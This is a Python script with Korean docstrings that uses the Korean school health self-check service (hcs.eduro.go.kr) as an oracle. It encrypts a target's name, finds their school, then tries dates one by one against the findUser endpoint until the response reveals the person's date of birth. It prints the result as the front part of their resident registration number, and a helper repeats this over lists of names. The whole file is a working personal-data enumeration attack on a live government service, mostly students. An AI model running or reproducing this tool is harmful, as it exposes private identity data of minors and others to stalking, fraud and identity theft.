import aiohttp
import datetime as dt
from json import dumps
from asyncio import run
from hcskr.transkey import mTransKey
from base64 import b64decode, b64encode
from Cryptodome.Cipher.PKCS1_v1_5 import new
from Cryptodome.PublicKey.RSA import importKey
from dateutil.relativedelta import relativedelta as red

PUBKEY = new(importKey(b64decode(
    'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi'
    '5u6sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMz'
    'sMTNxr+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfBs99K'
    '5xJEppHG0qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzO'
    'QExbQ4oDlZBv8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5n'
    'ykjaMB9k/EJAuHjJzGs9MMMWtQIDAQAB=='
)))


def encrypt(s: str) -> str:
    '''
    s를 PUBKEY로 암호화합니다.

    (권장) s의 길이는 245자 이하로 입력하는 것을 권장합니다.
    '''
    s = s.encode('utf-8')[:245]
    return b64encode(PUBKEY.encrypt(message=s)).decode('utf-8')


def getSidoEdu(sidoName: str) -> str:
    '''
    sidoName(시·도 이름)으로 시·도 교육청 영문 약자를 얻습니다.

    (권장) sidoName은 정식 명칭으로 입력하는 것을 권장합니다.
    '''
    if sidoName in {'서울특별시', '서울', '서울시'}:
        return 'sen'
    if sidoName in {'부산광역시', '부산', '부산시'}:
        return 'pen'
    if sidoName in {'대구광역시', '대구', '대구시'}:
        return 'dge'
    if sidoName in {'인천광역시', '인천', '인천시'}:
        return 'ice'
    if sidoName in {'광주광역시', '광주', '광주시'}:
        return 'gen'
    if sidoName in {'대전광역시', '대전', '대전시'}:
        return 'dje'
    if sidoName in {'울산광역시', '울산', '울산시'}:
        return 'use'
    if sidoName in {'세종특별자치시', '세종', '세종시', '세종자치시', '연기군'}:
        return 'sje'
    if sidoName in {'경기도', '경기'}:
        return 'goe'
    if sidoName in {'강원도', '강원'}:
        return 'kwe'
    if sidoName in {'충청북도', '충북', '충북도'}:
        return 'cbe'
    if sidoName in {'충청남도', '충남', '충남도'}:
        return 'cne'
    if sidoName in {'전라북도', '전북', '전북도'}:
        return 'jbe'
    if sidoName in {'전라남도', '전남', '전남도'}:
        return 'jne'
    if sidoName in {'경상북도', '경북', '경북도'}:
        return 'gbe'
    if sidoName in {'경상남도', '경남', '경남도'}:
        return 'gne'
    if sidoName in {'제주특별자치도', '제주', '제주시', '제주자치도'}:
        return 'jje'


def getSidoCode(sidoEdu: str) -> str:
    '''
    sidoEdu(시·도 교육청 영문 약자)로 시·도 교육청 코드를 얻습니다.

    (권장) sidoEdu는 getSidoEdu를 통해 입력하는 것을 권장합니다.
    '''
    match sidoEdu:
        case 'sen': return '01'
        case 'pen': return '02'
        case 'dge': return '03'
        case 'ice': return '04'
        case 'gen': return '05'
        case 'dje': return '06'
        case 'use': return '07'
        case 'sje': return '08'
        case 'goe': return '10'
        case 'kwe': return '11'
        case 'cbe': return '12'
        case 'cne': return '13'
        case 'jne': return '14'
        case 'jne': return '15'
        case 'gbe': return '16'
        case 'gne': return '17'
        case 'jje': return '18'


def getSchoolLevel(suffix: str) -> str:
    '''
    suffix(학교급)으로 학교급 코드를 얻습니다.

    (권장) suffix는 정식 명칭으로 입력하는 것을 권장합니다.
    '''
    if suffix in {'유치원', '유'}:
        return '1'
    if suffix in {'초등학교', '초', '초등'}:
        return '2'
    if suffix in {'중학교', '중', '중등'}:
        return '3'
    if suffix in {'고등학교', '고', '고등'}:
        return '4'
    if suffix in {'특수학교', '특', '특수'}:
        return '5'


def genURL(endpoint: str='/', sidoEdu: str='') -> str:
    '''
    endpoint(엔드 포인트)와 sido(시·도 교육청 영문 약자)로 URL을 만듭니다.

    (권장) sidoEdu는 getSidoEdu를 통해 입력하는 것을 권장합니다.
    '''
    return f'https://{sidoEdu}hcs.eduro.go.kr{endpoint}'


def safeType(c, t):
    '''
    c(변경할 것)를 t(변경할 타입)로 변경합니다.

    (오류) c를 t로 변경할 수 없을 때 False를 반환합니다.
    '''
    try:
        return t(c)
    except TypeError:
        return False


async def searchSchool(
    name: str, sidoCode: str, levelCode: str,
    session: aiohttp.ClientSession=None
):
    '''
    name(학교 이름), sidoCode(시·도 교육청 코드), levelCode(학교급 코드)로
    session(세션)에 연결하여 학교 정보를 검색합니다.

    (조건) name은 2자 이상으로 입력해야 합니다.
    (권장)
        sidoCode는 getSidoCode를, levelCode는 getSchoolLevel을 통해 입력하는 것을 권장합니다.
    (비권장) session은 입력하지 않으면 자동으로 새 세션을 생성합니다.
    '''
    sess = session or aiohttp.ClientSession()
    params = {
        'loginType': 'school',
        'orgName': name,
        'lctnScCode': sidoCode,
        'schulCrseScCode': levelCode
    }
    async with sess.get(genURL('/v2/searchSchool'), params=params) as resp:
        d = await resp.json()
    if not session:
        await sess.close()
    return d


async def findUser(
    orgCode: str, orgName: str, eName: str, birthday: str,
    sidoEdu: str, sidoCode: str, searchKey: str, password: str,
    session: aiohttp.ClientSession=None
) -> dict:
    '''
    orgCode(암호화 학교 코드)와 orgName(학교 이름),
    eName(암호화 이름)과 birthday(생년월일),
    sidoEdu(시·도 교육청 영문 약자)와 sidoCode(시·도 교육청 코드),
    searchKey(학교 검색 키), password(비밀번호)로
    session(세션)에 연결하여 사용자 정보를 불러옵니다.
    
    (조건) birthday는 YYMMDD 형식의 6자리여야 합니다.
    (권장)
        eName은 encrypt를 통해, sidoEdu는 getSiduEdu를 통해,
        sidoCode는 getSidoCode를 통해 입력하는 것을 추천합니다.
    (비권장) session은 입력하지 않으면 자동으로 새 세션을 생성합니다.
    '''
    sess = session or aiohttp.ClientSession()
    mtk = mTransKey(genURL('/transkeyServlet'))
    encrypted = (
        await mtk.new_keypad('number', 'password', 'password', 'password')
    ).encrypt_password(password)
    hm = mtk.hmac_digest(encrypted.encode())
    jsonData = {
        'orgCode': orgCode,
        'orgName': orgName,
        'name': eName,
        'birthday': encrypt(birthday),
        'loginType': 'school',
        'searchKey': searchKey,
        'deviceUuid': '',
        'lctnScCode': sidoCode,
        'makeSession': True,
        'password': dumps(
            {"raon": [{
                'id': 'password',
                'enc': encrypted,
                'hmac': hm,
                'keyboardType': 'number',
                'keyIndex': mtk.keyIndex,
                'fieldType': 'password',
                'seedKey': mtk.crypto.get_encrypted_key(),
                'initTime': mtk.initTime,
                'ExE2E': 'false'
            }]}
        )
    }
    header = {
        'Content-Type': 'application/json;charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        "Referer": genURL('/'),
        "Authorization": searchKey
    }
    async with sess.post(
        url=genURL('/v3/findUser', sidoEdu), json=jsonData, headers=header
    ) as resp:
        d = await resp.json()
    if not session:
        await sess.close()
    return d


async def findBirthday(
    name: str, year: int, month: int, date: int, sidoName: str,
    schoolLevel: str, orgName: str, endYear=False,
    session: aiohttp.ClientSession=None, password=''
) -> None:
    '''
    name(이름)과, year(생년), month(생월), date(생일) 정보와
    sidoName(시·도 이름), schoolLevel(학교급), orgName(학교 이름)로
    session을 이용하여 생년월일을 찾습니다.
    그리고 찾는 중에 endYear(탐색 중지 연도)에 도달하면 자동으로 찾는 것을 멈춥니다.

    (조건) endYear는 정수 또는 False입니다.
    (권장) sidoName과 schoolLevel, orgName은 정식 명칭으로 입력하는 것을 권장합니다.
    '''
    sess = session or aiohttp.ClientSession()
    sYear, sMonth, sDate = safeType(year, int), safeType(month, int), safeType(date, int)
    dInfo = dt.date(sYear or 1960, sMonth or 1, sDate or 1)
    today = dt.datetime.today()
    pw = password or ''
    eName = encrypt(name)
    sidoURL = getSidoEdu(sidoName)
    sidoCode = getSidoCode(sidoURL)
    schoolLevelCode = getSchoolLevel(schoolLevel)
    school = await searchSchool(orgName, sidoCode, schoolLevelCode)
    orgCode = school['schulList'][0]['orgCode'] # 암호화 학교 코드
    searchKey = school['key'] # 암호화 검색 키

    while not endYear or dInfo.year < int(endYear):
        dateStr = dt.date.strftime(dInfo, '%y%m%d')
        print(f'\r{name} 님의 생년월일을 찾는 중... {dateStr}', end='')
        try:
            d = await findUser(
                orgCode, orgName, # 학교 코드, 학교 이름
                eName, dateStr, # 암호화 이름, 날짜
                sidoURL, # 시·도 교육청 영문 약자
                sidoCode, # 시·도 교육청 코드
                searchKey, # 암호화 검색 키
                pw, sess # 비밀번호, 세션
            )
            if d.get('isError') and d.get('message') == '올바른 비밀번호를 입력하세요' or d.get('userName') == name:
                print(f'\r{name} 님의 주민등록번호 앞부분은 {dateStr}입니다.')
                break
        except:
            continue
        if endYear and dInfo.year >= int(endYear) or dInfo.year >= today.year:
            print(f'\n찾고 있는 날짜가 검색 중단 연도가 되어 탐색을 중지합니다.')
            break
        dInfo += red(years=1) if not sYear and sMonth and sDate else red(days=1)

    if not session:
        await sess.close()


def fb(*args, **kwargs):
    """
    *args, **kwargs를 이용해 findBirthday를 동기에서 실행합니다.
    자세한 내용은 findBirthday의 도움말을 참조하세요.
    """
    run(findBirthday(*args, **kwargs))


async def multiFind(names, *args, **kwargs):
    """
    names(이름들), *args, **kwargs를 이용해 findBirthday를 실행합니다.
    자세한 내용은 findBirthday의 도움말을 참조하세요.

    (조건) *args 또는 **kwargs에 이름을 입력하면 안 됩니다.
    (권장) *args 또는 **kwargs에 session을 입력하는 것을 권장합니다.
    """
    for s in names:
        await findBirthday(s, *args, **kwargs)


def mf(*args, **kwargs):
    """
    *args, **kwargs를 이용해 multiFind를 동기에서 실행합니다.
    자세한 내용은 multiFind의 도움말을 참조하세요.
    """
    run(multiFind(*args, **kwargs))